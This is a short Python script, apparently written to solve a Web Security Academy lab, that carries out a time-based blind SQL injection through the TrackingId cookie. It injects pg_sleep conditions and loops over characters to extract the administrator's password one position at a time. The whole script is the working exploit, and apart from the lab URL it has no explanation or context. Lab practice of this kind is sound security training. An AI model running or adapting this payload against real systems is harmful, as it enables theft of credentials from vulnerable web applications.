import requests
import string

url = "https://0ad300c503da1d9cc00e271b00ad00e6.web-security-academy.net/"
cookies = {"TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"}

for i in range(1, 21):
    for j in string.printable:
        cookies = {"TrackingId":"TrackingId=TrackingId=Bo6DofnwE7hELTVL'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,"+str(i)+",1)='"+j+"')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"}
        r = requests.get(url, cookies=cookies)
        if r.elapsed.total_seconds() > 2:
            print(j, end="")
            break